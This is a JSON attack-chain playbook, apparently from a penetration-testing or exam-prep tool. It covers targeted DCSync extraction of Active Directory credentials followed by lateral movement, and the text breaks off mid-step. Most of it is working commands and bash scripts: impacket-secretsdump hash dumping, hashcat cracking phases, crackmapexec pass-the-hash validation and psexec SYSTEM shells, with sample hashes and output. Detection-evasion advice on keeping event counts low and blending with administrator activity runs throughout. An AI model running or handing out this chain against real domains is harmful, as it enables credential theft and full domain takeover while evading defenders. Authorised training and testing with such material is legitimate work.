{
  "id": "ad-dcsync-lateral-movement",
  "name": "DCSync Targeted Extraction for Surgical Lateral Movement",
  "description": "Advanced attack chain for surgical credential extraction and precision lateral movement to high-value targets.\n\nIdentifies and prioritizes specific high-value user accounts (Domain Admins, service accounts, IT admins), extracts their credentials via targeted DCSync, validates access, and executes lateral movement to critical systems. IDEAL for security work scenarios requiring specific target compromise with minimal noise.\n\nDETECTION RISK: Low-Medium. Targeted DCSync (10-50 users) generates far less replication traffic than full dump, surgical PTH validation avoids spray detection, PSExec provides SYSTEM shells for privilege escalation. TRADEOFF: Precision and stealth vs broad coverage.",
  "version": "1.0.0",
  "metadata": {
    "author": "CRACK Development Team - pentest Track",
    "created": "2025-11-23",
    "updated": "2025-11-23",
    "tags": [
      "ACTIVE_DIRECTORY",
      "DCSYNC",
      "TARGETED_EXTRACTION",
      "LATERAL_MOVEMENT",
      "PRIVILEGE_ESCALATION",
      "PASS_THE_HASH",
      "CREDENTIAL_ACCESS"
    ],
    "category": "credential-access",
    "platform": "active-directory",
    "references": [
      "https://attack.mitre.org/techniques/T1003/006/",
      "https://attack.mitre.org/techniques/T1021/002/",
      "https://attack.mitre.org/techniques/T1550/002/",
      "https://adsecurity.org/?p=2362",
      "https://github.com/fortra/impacket"
    ]
  },
  "difficulty": "advanced",
  "time_estimate": "60 minutes",
  "prerequisites": [
    "Domain Admin credentials OR Domain User with replication rights (DCSync permissions)",
    "Network access to Domain Controller (SMB 445/tcp, RPC 135/tcp)",
    "Basic domain reconnaissance completed (user enumeration, group membership identification)",
    "Kali Linux with Impacket and Hashcat installed",
    "Target system identification (specific objectives: file server, database server, admin workstation)"
  ],
  "notes": "TARGETED EXTRACTION STRATEGY: This chain focuses on PRECISION over coverage. Use when: (1) Exam objective specifies particular system or data, (2) Full domain dump excessive or time-constrained, (3) Stealth important (minimize detection), (4) Known high-value accounts identified through enumeration. TARGET PRIORITIZATION: (1) Domain Admins (unrestricted domain access), (2) Local Administrators on target system (direct access), (3) Service accounts with elevated privileges (SQL, Exchange, backup services), (4) IT administrators (likely admin on multiple systems). EXPECTED RESULTS: 10-20 targeted users \u2192 50-80% crack rate (admin accounts often have stronger passwords but still vulnerable), 30-60% local admin access on target systems. TIME ADVANTAGE: Targeted approach 3-5x faster than full domain dump (5-10 min DCSync vs 20-60 min full dump). DETECTION ADVANTAGE: Targeted DCSync generates 10-50 EventID 4662 events vs thousands for full dump, surgical PTH validation avoids failed logon spam. PRACTICAL TIP: Map user-to-system access before DCSync - enumerate local admin group membership on targets to identify which users to extract. ALTERNATIVE APPROACHES: If specific users unknown, try (1) AS-REP roasting (pre-auth disabled users), (2) Kerberoasting (service accounts), (3) Local SAM dumps from compromised workstations (may contain cached domain credentials).",
  "steps": [
    {
      "id": "enumerate-high-value-targets",
      "name": "Identify High-Value User Accounts for Targeted Extraction",
      "objective": "Enumerate and prioritize specific user accounts that provide lateral movement paths to target systems",
      "description": "TARGET IDENTIFICATION STRATEGY: Focus DCSync efforts on users most likely to provide access to specific systems or sensitive data.\n\nHIGH-VALUE ACCOUNT CATEGORIES:\n\n(1) DOMAIN ADMINS (Unrestricted domain access):\nnet group \"Domain Admins\" /domain\nOR (from Kali):\nrpcclient -U 'username%password' <DC_IP> -c 'enumdomgroups' | grep -i admin\nldapsearch -x -H ldap://<DC_IP> -D 'username@domain' -w 'password' -b 'DC=corp,DC=com' '(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=com)' sAMAccountName\n\nExpected output:\nAdministrator\nsql_admin\nbackup_admin\n<...Domain Admin members...>\n\n(2) LOCAL ADMINISTRATORS ON TARGET SYSTEMS:\n\nMethod A: Remote registry query (requires admin access to target):\nreg query \"\\\\\\\\<TARGET>\\\\HKLM\\\\SAM\\\\SAM\\\\Domains\\\\Account\\\\Users\\\\Names\" /s\n\nMethod B: CrackMapExec local admin enumeration:\ncrackmapexec smb <TARGET> -u <user> -p <pass> --local-groups Administrators\n\nOutput:\n[+] 10.10.10.100   [*] Members of group 'Administrators':\n    corp\\\\Administrator\n    corp\\\\sqlsvc\n    corp\\\\backup_admin\n\nMethod C: PowerView (if Windows access):\nGet-NetLocalGroupMember -ComputerName <TARGET> -GroupName Administrators\n\n(3) SERVICE ACCOUNTS (Often over-privileged):\n\nIdentify service accounts (naming patterns):\nldapsearch -x -H ldap://<DC_IP> -D 'user@domain' -w 'pass' -b 'DC=corp,DC=com' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName\n\nCommon patterns:\n- svc_*, service_*, sql*, mssql*, admin*, backup*, web*, iis*\n\nExample output:\nsqlsvc (MSSQLSvc/sql01.corp.com:1433)\nbackupsvc (BackupExec/backup01.corp.com)\nwebadmin (HTTP/web01.corp.com)\n\n(4) IT ADMINISTRATORS (Likely admin on multiple systems):\n\nQuery IT groups:\nnet group \"IT Admins\" /domain\nnet group \"Help Desk\" /domain\nnet group \"Server Admins\" /domain\n\nCross-reference with target systems:\nFor each IT admin, check local admin membership on targets via CrackMapExec.\n\nPRIORITIZATION MATRIX:\n\nCreate target list (targets.txt):\n# Priority 1: Domain Admins (unrestricted access)\nAdministrator\nsql_admin\nbackup_admin\n\n# Priority 2: Local admins on target systems  \nsqlsvc (admin on SQL01: 10.10.10.100)\nwebadmin (admin on WEB01: 10.10.10.105)\n\n# Priority 3: Service accounts (potentially over-privileged)\nbackupsvc\niis_service\n\n# Priority 4: IT admins (multi-system access likely)\njdoe_admin\nhelpdeskuser\n\nUSERNAME EXTRACTION FOR DCSYNC:\n\nFrom enumeration above, extract just usernames:\nAdministrator\nsql_admin\nbackup_admin\nsqlsvc\nwebadmin\nbackupsvc\niis_service\njdoe_admin\n\nSave to file:\necho -e \"Administrator\\nsql_admin\\nbackup_admin\\nsqlsvc\\nwebadmin\\nbackupsvc\\niis_service\\njdoe_admin\" > dcsync_targets.txt\n\nVALIDATION: Verify target list is reasonable size.\nwc -l dcsync_targets.txt\nOptimal: 10-50 users (fast DCSync, high success probability)\nToo many: >100 users (consider full dump instead)\nToo few: <5 users (may miss lateral movement opportunities)\n\nOPSEC CONSIDERATION: User enumeration generates LDAP queries (EventID 4662) but is common administrative activity - low detection risk.\n\nTIME ESTIMATE: 10-15 minutes (enumeration and prioritization).",
      "command_ref": "crackmapexec-validate-admin",
      "evidence": [
        "Domain Admin group members identified",
        "Local administrator users on target systems enumerated",
        "Service accounts with SPNs identified",
        "IT administrator group members documented",
        "dcsync_targets.txt created with prioritized user list (10-50 users)",
        "Target-to-user mapping documented (which users access which systems)"
      ],
      "dependencies": [],
      "repeatable": true,
      "success_criteria": [
        "High-value users identified across all categories",
        "Target list created with 10-50 prioritized users",
        "User-to-system access mapping documented",
        "Domain Admin accounts identified (highest priority)"
      ],
      "failure_conditions": [
        "LDAP query access denied (insufficient permissions for enumeration)",
        "Zero Domain Admins identified (unusual - verify domain name correct)",
        "Cannot enumerate local groups on targets (no admin access for recon)",
        "Service account enumeration returns empty (SPN query blocked or no SPNs)"
      ],
      "next_steps": [
        "verify-dcsync-permissions"
      ]
    },
    {
      "id": "verify-dcsync-permissions",
      "name": "Verify DCSync Permissions Before Targeted Extraction",
      "objective": "Confirm replication rights and DC connectivity before executing targeted DCSync operations",
      "description": "PREREQUISITE VERIFICATION: Same permissions required for targeted DCSync as full dump, but verify BEFORE iterating through target list to avoid wasting time.\n\nREQUIRED PERMISSIONS:\n- DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)\n- DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n\nQUICK VERIFICATION TEST:\nimpacket-secretsdump -just-dc-user Administrator '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'\n\nSUCCESS: Administrator hash retrieved \u2192 Rights confirmed, proceed to targeted DCSync loop.\nFAILURE: ERROR_ACCESS_DENIED \u2192 Insufficient rights, STOP (cannot proceed with any DCSync).\n\nNETWORK CONNECTIVITY VERIFICATION:\nsudo nmap -p 445,135 -Pn -v <DC_IP>\n\nREQUIRED:\n445/tcp open (SMB - primary replication channel)\n135/tcp open (RPC - DRSUAPI endpoint mapper)\n\nTIME SYNCHRONIZATION (Critical for Kerberos):\nsudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>\ndate (verify <5 min difference from DC)\n\nOPSEC BASELINE:\n- Single user DCSync test generates 1 EventID 4662 event\n- Targeted extraction of 20 users = 20 EventID 4662 events\n- Compare to full dump: 2000 users = 2000 events\n- Targeted approach = 99% reduction in detection signature\n\nBANDWIDTH ESTIMATE:\n- Single user extraction: ~10 KB transfer, <5 seconds\n- 20 users: ~200 KB transfer, <2 minutes\n- 50 users: ~500 KB transfer, <5 minutes\n\nCRITICAL: If verification test fails, DO NOT proceed with target list iteration.\nAlternative approaches:\n(1) Obtain Domain Admin credentials via different method (Kerberoasting, AS-REP roasting, local privilege escalation)\n(2) Add replication rights to compromised account (requires high privileges)\n(3) Extract NTDS.dit via VSS shadow copy (different permissions required)\n\nTIME ESTIMATE: 2-3 minutes.",
      "command_ref": "ad-dcsync-check-permissions",
      "evidence": [
        "Test DCSync succeeds (Administrator hash retrieved)",
        "DC accessible on ports 445 and 135",
        "Time synchronized within 5 minutes",
        "No permission or authentication errors",
        "Bandwidth sufficient for targeted extraction"
      ],
      "dependencies": [
        "enumerate-high-value-targets"
      ],
      "repeatable": true,
      "success_criteria": [
        "DCSync permissions confirmed via test extraction",
        "Network connectivity verified to DC",
        "Time synchronization within Kerberos tolerance",
        "No access denied or RPC errors"
      ],
      "failure_conditions": [
        "ERROR_ACCESS_DENIED (no replication rights - cannot proceed)",
        "rpc_s_access_denied (DCSync permissions missing)",
        "Connection timeout (DC unreachable or ports filtered)",
        "KRB_AP_ERR_SKEW (time sync issue - must fix before proceeding)",
        "User not found (wrong domain or DC address)"
      ],
      "next_steps": [
        "dcsync-targeted-users"
      ]
    },
    {
      "id": "dcsync-targeted-users",
      "name": "Execute Targeted DCSync for High-Value User Credentials",
      "objective": "Extract NTLM hashes for specific prioritized users to minimize detection and maximize efficiency",
      "description": "TARGETED DCSYNC LOOP: Iterate through priority user list (dcsync_targets.txt) and extract credentials individually.\n\nSINGLE USER DCSYNC COMMAND:\nimpacket-secretsdump -just-dc-user <USERNAME> '<DOMAIN>/<ADMIN_USER>:<PASSWORD>@<DC_IP>' >> targeted_hashes.txt\n\nExample:\nimpacket-secretsdump -just-dc-user sqlsvc 'corp.com/dave:Password123!@10.10.10.1' >> targeted_hashes.txt\n\nOUTPUT FORMAT (appended to targeted_hashes.txt):\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\nsqlsvc:1125:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n\nAUTOMATED EXTRACTION LOOP (Bash script):\n\n#!/bin/bash\nDOMAIN=\"corp.com\"\nADMIN_USER=\"dave\"\nADMIN_PASS=\"Password123!\"\nDC_IP=\"10.10.10.1\"\nOUTPUT=\"targeted_hashes.txt\"\n\necho \"[*] Starting targeted DCSync extraction\"\necho \"[*] Timestamp: $(date)\" > $OUTPUT\n\nwhile read username; do\n  echo \"[*] Extracting: $username\"\n  impacket-secretsdump -just-dc-user \"$username\" \"$DOMAIN/$ADMIN_USER:$ADMIN_PASS@$DC_IP\" 2>&1 | tee -a $OUTPUT\n  \n  # Check if extraction succeeded\n  if grep -q \"$username:\" $OUTPUT; then\n    echo \"[+] SUCCESS: $username extracted\"\n  else\n    echo \"[-] FAILED: $username not found or error\"\n  fi\n  \n  # Small delay to avoid hammering DC (OPSEC)\n  sleep 2\ndone < dcsync_targets.txt\n\necho \"[*] Targeted DCSync complete\"\necho \"[*] Results saved to: $OUTPUT\"\nwc -l $OUTPUT\n\nEXECUTE SCRIPT:\nchmod +x targeted_dcsync.sh\n./targeted_dcsync.sh\n\nMONITORING PROGRESS:\ntail -f targeted_hashes.txt (watch real-time extraction)\n\nExpected output:\n[*] Extracting: Administrator\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::\n[+] SUCCESS: Administrator extracted\n[*] Extracting: sqlsvc\nsqlsvc:1125:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n[+] SUCCESS: sqlsvc extracted\n[*] Extracting: webadmin\n[-] FAILED: webadmin not found or error\n<...continues for all users in dcsync_targets.txt...>\n\nERROR HANDLING:\n\n- \"User not found\": Username misspelled or account doesn't exist (skip, continue to next)\n- \"Access denied\" mid-loop: Credentials invalidated or rights revoked (STOP, investigate)\n- \"Connection timeout\": Network instability or DC offline (retry or abort)\n\nFAILURE RECOVERY: If script interrupted, targeted_hashes.txt preserves partial results.\nResume: Remove successfully extracted users from dcsync_targets.txt, re-run script.\n\nEXTRACT CLEAN HASH LIST:\ngrep -E '^[a-zA-Z0-9_-]+:[0-9]+:' targeted_hashes.txt > clean_hashes.txt\n\nFormat:\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::\nsqlsvc:1125:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\nbackup_admin:1130:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::\n<...extracted hashes only, no script output...>\n\nEXTRACT NTLM HASHES FOR HASHCAT:\ngrep -E '^[a-zA-Z0-9_-]+:[0-9]+:' targeted_hashes.txt | cut -d ':' -f 4 > ntlm_hashes.txt\n\nResult (ntlm_hashes.txt):\na9b30e5b0dc865eadcea9411e4ade72d\n8846f7eaee8fb117ad06bdd830b7586c\n5f4dcc3b5aa765d61d8327deb882cf99\n<...pure NTLM hashes for cracking...>\n\nOPSEC IMPACT:\n\nDetection comparison:\n- Full domain dump (2000 users): 2000 EventID 4662 events, 20-60 min duration, 500MB-1GB transfer\n- Targeted extraction (20 users): 20 EventID 4662 events, 2-5 min duration, 200KB transfer\n\nREDUCTION: 99% fewer events, 90% faster, 99.96% less data transfer\n\nBLUE TEAM PERSPECTIVE: 20 replication events over 5 minutes blends with legitimate administrative activity.\n2000 events over 30 minutes from non-DC IP = INSTANT ALERT.\n\nTIME ESTIMATES:\n- 10 users: 1-2 minutes\n- 20 users: 2-4 minutes\n- 50 users: 5-10 minutes\n\nTIME ESTIMATE: 3-7 minutes (20-30 targeted users).",
      "command_ref": "ad-dcsync-impacket-secretsdump-user",
      "evidence": [
        "targeted_hashes.txt created with extracted credentials",
        "clean_hashes.txt contains formatted hash list",
        "ntlm_hashes.txt contains pure NTLM hashes for Hashcat",
        "Extraction success rate >80% (missing users documented)",
        "No extraction errors or permission issues"
      ],
      "dependencies": [
        "verify-dcsync-permissions"
      ],
      "repeatable": true,
      "success_criteria": [
        "Target users extracted successfully (>80% success rate)",
        "NTLM hashes saved in crackable format",
        "No mid-extraction permission errors",
        "All Priority 1 users (Domain Admins) extracted successfully"
      ],
      "failure_conditions": [
        "ERROR_ACCESS_DENIED mid-extraction (credentials revoked or rights removed)",
        "User not found for critical targets (wrong usernames - re-verify enumeration)",
        "Connection timeout (network instability - retry or continue)",
        "Low success rate <50% (enumeration data stale or inaccurate)"
      ],
      "next_steps": [
        "crack-targeted-hashes"
      ]
    },
    {
      "id": "crack-targeted-hashes",
      "name": "Crack Targeted NTLM Hashes with Focused Attack Strategy",
      "objective": "Recover plaintext passwords for high-value accounts using optimized cracking approach",
      "description": "TARGETED CRACKING STRATEGY: Focus on high-quality attacks for small hash set. Better results than fast attacks on large hash set.\n\nHASH SET SIZE: 10-50 hashes (from targeted DCSync)\nCRACKING APPROACH: Use multiple attack vectors, invest more time per hash.\n\nATTACK PHASE 1: STRAIGHT DICTIONARY (Baseline - fast)\nhashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force\n\nTime: 1-5 minutes\nExpected: 15-25% crack rate (weak passwords: Password1, Welcome123, company name)\n\nATTACK PHASE 2: RULE-BASED ATTACK (Primary attack - best ROI)\nhashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n\nRule mutations:\n- Capitalize: password \u2192 Password\n- Uppercase: password \u2192 PASSWORD  \n- Append numbers: password \u2192 password1, password123, password2023\n- Leet: password \u2192 p@ssw0rd\n- Common patterns: password \u2192 Password1!, Passw0rd!, P@ssword123\n\nTime: 10-30 minutes\nExpected: 40-60% crack rate (admin accounts with corporate password policies)\n\nATTACK PHASE 3: CUSTOM WORDLIST (Organization-specific)\n\nCreate custom wordlist from org intelligence:\necho -e \"CompanyName\\nDepartment\\nCEOname\\nCityName\\nProductName\\nYear2023\\nWelcome\\nPassword\" > custom.txt\n\nCombination attacks:\nhashcat -m 1000 -a 0 ntlm_hashes.txt custom.txt -r /usr/share/hashcat/rules/best64.rule --force\n\nTime: 5-10 minutes\nExpected: Additional 10-20% crack rate (organization-specific passwords)\n\nATTACK PHASE 4: HYBRID ATTACK (Wordlist + mask)\nhashcat -m 1000 -a 6 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt ?d?d?d?d --force\n\nAppends 0000-9999 to each wordlist word.\nExample: Password \u2192 Password0000, Password0001, ..., Password9999\n\nTime: 30-90 minutes (small hash set, so feasible)\nExpected: Additional 5-15% crack rate (year patterns: Password2023, Welcome2024)\n\nATTACK PHASE 5: MASK ATTACK (Pattern-based - if time permits)\n\nCommon corporate patterns:\n?u?l?l?l?l?l?l?l?d?d?d?d (Uppercase + 7 lowercase + 4 digits: Password1234)\n?u?l?l?l?l?l?l?d?d?d! (Uppercase + 6 lowercase + 3 digits + !: Welcome123!)\n\nMask attack:\nhashcat -m 1000 -a 3 ntlm_hashes.txt ?u?l?l?l?l?l?l?l?d?d?d?d --force\n\nTime: Hours (keyspace dependent)\nExpected: Variable (catches pattern-based passwords not in wordlists)\n\nMONITOR CRACKING PROGRESS:\n\nPress 's' for status:\nSpeed.........: 500.0 MH/s\nRecovered.....: 12/23 (52.17%) Digests\nProgress......: 14344384/14344384 (100.00%)\n\nVIEW CRACKED PASSWORDS:\nhashcat -m 1000 ntlm_hashes.txt --show\n\nOutput:\na9b30e5b0dc865eadcea9411e4ade72d:Password123!\n8846f7eaee8fb117ad06bdd830b7586c:SQLPass2023\n5f4dcc3b5aa765d61d8327deb882cf99:Backup1!\n<...hash:password pairs...>\n\nMAP HASHES TO USERNAMES:\n\nCreate username:password list for validation:\nwhile read line; do\n  hash=$(echo $line | cut -d ':' -f 1)\n  pass=$(echo $line | cut -d ':' -f 2)\n  user=$(grep \"$hash\" clean_hashes.txt | cut -d ':' -f 1)\n  if [ -n \"$user\" ]; then\n    echo \"$user:$pass\"\n  fi\ndone < <(hashcat -m 1000 ntlm_hashes.txt --show) > cracked_credentials.txt\n\nResult (cracked_credentials.txt):\nAdministrator:Password123!\nsqlsvc:SQLPass2023\nbackup_admin:Backup1!\nwebadmin:IIS2023Web!\n<...username:password ready for use...>\n\nPRIORITY VERIFICATION:\n\nCheck if Domain Admin accounts cracked:\ngrep -f <(cat dcsync_targets.txt | head -5) cracked_credentials.txt\n\nIf Domain Admin cracked: CRITICAL WIN - domain-wide access available.\nIf service accounts cracked: Check target system access (SQL, Web servers).\nIf IT admins cracked: Likely admin on multiple systems.\n\nUNCRACKED HASH USAGE:\n\nIMPORTANT: Can use NTLM hashes directly with Pass-the-Hash (no plaintext needed).\n\nExtract uncracked hashes:\ncomm -23 <(cut -d ':' -f 4 clean_hashes.txt | sort) <(hashcat -m 1000 ntlm_hashes.txt --show | cut -d ':' -f 1 | sort) > uncracked_hashes.txt\n\nMap back to usernames:\nfor hash in $(cat uncracked_hashes.txt); do\n  grep \"$hash\" clean_hashes.txt\ndone > uncracked_users.txt\n\nResult: Can still use for PTH validation even without plaintext passwords.\n\nCRACKING OPTIMIZATION:\n\n- Small hash set (10-50) allows longer attacks per hash\n- Prioritize attacks on Domain Admin hashes (most valuable)\n- Stop after 60%+ crack rate if time-constrained (diminishing returns)\n- GPU cracking 10-50x faster if available\n\nFAILURE SCENARIOS:\n\n- Zero cracks after Phase 1-2: Admin accounts have strong passwords\n  \u2192 Solution: Try custom wordlists (company name, location, products)\n  \u2192 Alternative: Use uncracked hashes with PTH (no plaintext needed)\n\n- Low crack rate <30%: Strong password policy enforced\n  \u2192 Solution: Extend to Phase 4-5 attacks, use organizational intelligence\n\nTIME ESTIMATE: 20-40 minutes (Phase 1-3 attacks, sufficient for security work).",
      "command_ref": "windows-hashcat-crack-ntlm",
      "evidence": [
        "Hashcat completes Phase 1-3 attacks minimum",
        "cracked_credentials.txt created with username:password pairs",
        "Crack rate >40% achieved (sufficient for targeted access)",
        "Domain Admin accounts cracked (if present in target list)",
        "uncracked_users.txt documented (for PTH fallback)"
      ],
      "dependencies": [
        "dcsync-targeted-users"
      ],
      "repeatable": true,
      "success_criteria": [
        "Minimum 40% crack rate achieved",
        "At least one Domain Admin OR target system admin account cracked",
        "Cracked credentials mapped to usernames correctly",
        "Uncracked hashes preserved for PTH attempts"
      ],
      "failure_conditions": [
        "Zero cracks after all attacks (extremely strong passwords - rely on PTH)",
        "Hashcat errors prevent cracking (GPU/CPU issues)",
        "Hash-to-username mapping failed (corrupted data)",
        "Critical target accounts remain uncracked (may need alternative approach)"
      ],
      "next_steps": [
        "validate-credentials-pth"
      ]
    },
    {
      "id": "validate-credentials-pth",
      "name": "Validate Credentials and NTLM Hashes with Pass-the-Hash",
      "objective": "Confirm cracked passwords and uncracked hashes work for authentication and identify target system access",
      "description": "VALIDATION STRATEGY: Test both cracked passwords AND uncracked NTLM hashes against target systems to map user-to-system access.\n\nTARGET SYSTEMS (From enumeration step 1):\n- SQL01: 10.10.10.100 (sqlsvc should have admin access)\n- WEB01: 10.10.10.105 (webadmin should have admin access)\n- DC01: 10.10.10.1 (Domain Admins should have access)\n- FILE01: 10.10.10.110 (backup_admin should have access)\n\nVALIDATION METHOD 1: CRACKMAPEXEC WITH PASSWORDS (Cracked accounts)\n\nTest specific user against specific target:\ncrackmapexec smb 10.10.10.100 -u sqlsvc -p 'SQLPass2023' -d corp.com\n\nExpected output:\n[+] 10.10.10.100:445 SQL01 [+] corp.com\\\\sqlsvc:SQLPass2023 (Pwn3d!)\n                                                              ^^^^^^^^ LOCAL ADMIN ACCESS CONFIRMED\n\nOR:\n[+] 10.10.10.100:445 SQL01 [+] corp.com\\\\sqlsvc:SQLPass2023\n                                                              (no Pwn3d) = Valid creds, NOT admin\n\nVALIDATION METHOD 2: CRACKMAPEXEC WITH NTLM HASHES (Uncracked accounts)\n\nTest uncracked hash:\ncrackmapexec smb 10.10.10.110 -u backup_admin -H '5f4dcc3b5aa765d61d8327deb882cf99' -d corp.com\n\nSame output format - works without plaintext password.\n\nAUTOMATED VALIDATION SCRIPT:\n\n#!/bin/bash\nDOMAIN=\"corp.com\"\nTARGETS=\"10.10.10.100 10.10.10.105 10.10.10.110\"\nOUTPUT=\"validation_results.txt\"\n\necho \"[*] Validating cracked credentials\" > $OUTPUT\n\n# Test cracked passwords\nwhile IFS=':' read user pass; do\n  echo \"[*] Testing: $user:$pass\"\n  for target in $TARGETS; do\n    crackmapexec smb $target -u \"$user\" -p \"$pass\" -d $DOMAIN 2>&1 | tee -a $OUTPUT\n  done\ndone < cracked_credentials.txt\n\necho \"\" >> $OUTPUT\necho \"[*] Validating uncracked hashes (PTH)\" >> $OUTPUT\n\n# Test uncracked hashes\nwhile read line; do\n  user=$(echo $line | cut -d ':' -f 1)\n  hash=$(echo $line | cut -d ':' -f 4)\n  echo \"[*] Testing: $user (hash)\"\n  for target in $TARGETS; do\n    crackmapexec smb $target -u \"$user\" -H \"$hash\" -d $DOMAIN 2>&1 | tee -a $OUTPUT\n  done\ndone < uncracked_users.txt\n\necho \"[*] Validation complete\"\ngrep \"Pwn3d\" $OUTPUT | tee pwned_access.txt\n\nEXECUTE VALIDATION:\nchmod +x validate_access.sh\n./validate_access.sh\n\nANALYZE RESULTS:\n\nExtract (Pwn3d!) access:\ncat pwned_access.txt\n\nExpected output:\n[+] 10.10.10.100:445 SQL01 [+] corp.com\\\\sqlsvc:SQLPass2023 (Pwn3d!)\n[+] 10.10.10.105:445 WEB01 [+] corp.com\\\\webadmin:IIS2023Web! (Pwn3d!)\n[+] 10.10.10.1:445   DC01  [+] corp.com\\\\Administrator:Password123! (Pwn3d!)\n\nCREATE ACCESS MATRIX:\n\n| User          | Target System | IP             | Access Level | Auth Method |\n|---------------|---------------|----------------|--------------|-------------|\n| Administrator | DC01          | 10.10.10.1   | Local Admin  | Password    |\n| sqlsvc        | SQL01         | 10.10.10.100 | Local Admin  | Password    |\n| webadmin      | WEB01         | 10.10.10.105 | Local Admin  | Password    |\n| backup_admin  | FILE01        | 10.10.10.110 | Local Admin  | NTLM Hash   |\n\nSave to: access_matrix.md\n\nPRIORITIZE TARGETS:\n\nHIGHEST VALUE:\n- Domain Controller access (any Domain Admin) = Full domain compromise\n- Database server admin = Sensitive data access, credential hunting in DB\n- File server admin = Document access, GPO files in SYSVOL\n\nNEXT STEP DECISION:\n- If Domain Admin access confirmed \u2192 Can access ANY domain resource (proceed to step 6)\n- If target system admin confirmed \u2192 Direct access to objective (proceed to step 6)\n- If no (Pwn3d!) results \u2192 Need privilege escalation OR try additional users\n\nVALIDATION CONFIRMATION:\n\nTest actual access (not just SMB):\nimpacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.com/sqlsvc@10.10.10.100\n\nIf drops to C:\\\\> prompt with SYSTEM privileges \u2192 Access CONFIRMED.\n\nFAILURE SCENARIOS:\n\n- All STATUS_LOGON_FAILURE: Wrong domain, account lockouts, or credentials invalidated\n  \u2192 Verify: Domain name correct, check account status (net user <user> /domain)\n\n- Valid auth but no (Pwn3d!): Users are standard users, not local admins\n  \u2192 Solution: Try privilege escalation after gaining shell access\n\n- Connection timeout: SMB port 445 blocked\n  \u2192 Alternative: Try WinRM (port 5985) with crackmapexec winrm\n\nTIME ESTIMATE: 5-10 minutes (validation across 3-5 target systems).",
      "command_ref": "ad-pass-the-hash-crackmapexec",
      "evidence": [
        "validation_results.txt created with all test results",
        "pwned_access.txt shows (Pwn3d!) systems",
        "access_matrix.md documents user-to-system mapping",
        "At least one high-value target has (Pwn3d!) access",
        "Domain Controller access confirmed (if Domain Admin cracked)"
      ],
      "dependencies": [
        "crack-targeted-hashes"
      ],
      "repeatable": true,
      "success_criteria": [
        "Credentials validated successfully (no lockouts)",
        "At least one target system shows (Pwn3d!) access",
        "Access matrix created mapping users to systems",
        "PTH works for uncracked hashes (authentication succeeds)"
      ],
      "failure_conditions": [
        "Zero (Pwn3d!) results (users lack local admin on targets - need different approach)",
        "Account lockouts triggered (validation too aggressive)",
        "All authentications fail (wrong domain or network issues)",
        "Target systems unreachable (firewall blocking SMB)"
      ],
      "next_steps": [
        "lateral-movement-psexec"
      ]
    },
    {
      "id": "lateral-movement-psexec",
      "name": "Execute Lateral Movement with PSExec for SYSTEM Shells",
      "objective": "Establish SYSTEM-level shell access on validated target systems for privilege escalation and objective completion",
      "description": "PSEXEC vs WMIEXEC TRADE-OFF:\n- PSExec: Creates service (PSEXESVC), writes to ADMIN$, provides SYSTEM shell (highest privileges)\n- WMIExec: No service, no file writes (stealthier), provides user-level shell\n\nUSE PSEXEC WHEN:\n(1) Need SYSTEM privileges (credential dumping, system file access)\n(2) Target is validated (Pwn3d!) - detection risk acceptable\n(3) Objective requires full system control\n(4) Quick wins prioritized over stealth\n\nIMPACKET PSEXEC COMMAND:\n\nWith password (cracked accounts):\nimpacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'\n\nWith NTLM hash (uncracked accounts - Pass-the-Hash):\nimpacket-psexec -hashes :<NTLM_HASH> '<DOMAIN>/<USERNAME>@<TARGET>'\n\nExample (password):\nimpacket-psexec 'corp.com/sqlsvc:SQLPass2023@10.10.10.100'\n\nExample (hash):\nimpacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c 'corp.com/sqlsvc@10.10.10.100'\n\nSUCCESSFUL CONNECTION:\n[*] Requesting shares on 10.10.10.100.....\n[*] Found writable share ADMIN$\n[*] Uploading file <random>.exe\n[*] Opening SVCManager on 10.10.10.100.....\n[*] Creating service <random> on 10.10.10.100.....\n[*] Starting service <random>.....\n[*] Got shell!\n\nC:\\\\Windows\\\\system32>\nwhoami\nnt authority\\\\system\n        ^^^^^^^^^^^^^^^^ SYSTEM privileges confirmed\n\nhostname\nSQL01\n\nHIGH-VALUE SYSTEM ACTIONS:\n\n(1) DATABASE SERVER (SQL01 - sqlsvc access):\n\nC:\\\\> whoami\nnt authority\\\\system\n\nC:\\\\> dir \"C:\\\\Program Files\\\\Microsoft SQL Server\"\n(Identify SQL instance)\n\nC:\\\\> sqlcmd -S localhost -E -Q \"SELECT name FROM sys.databases\"\n(List databases)\n\nC:\\\\> sqlcmd -S localhost -E -Q \"SELECT * FROM master.dbo.syslogins WHERE sysadmin = 1\"\n(Find SA-equivalent accounts)\n\nCredential hunting:\nC:\\\\> findstr /si password *.config *.xml *.ini\nC:\\\\> findstr /si connectionstring *.config\n(Find database connection strings with credentials)\n\n(2) FILE SERVER (FILE01 - backup_admin access):\n\nC:\\\\> whoami\nnt authority\\\\system\n\nC:\\\\> dir C:\\\\Shares\nC:\\\\> dir \\\\\\\\localhost\\\\SharedData\n(Browse shared data)\n\nC:\\\\> dir /s /b C:\\\\*.kdbx C:\\\\*.key C:\\\\*password* C:\\\\*backup*\n(Find KeePass databases, password files, backups)\n\nC:\\\\> icacls C:\\\\Shares\\\\Confidential\n(Check file permissions)\n\n(3) WEB SERVER (WEB01 - webadmin 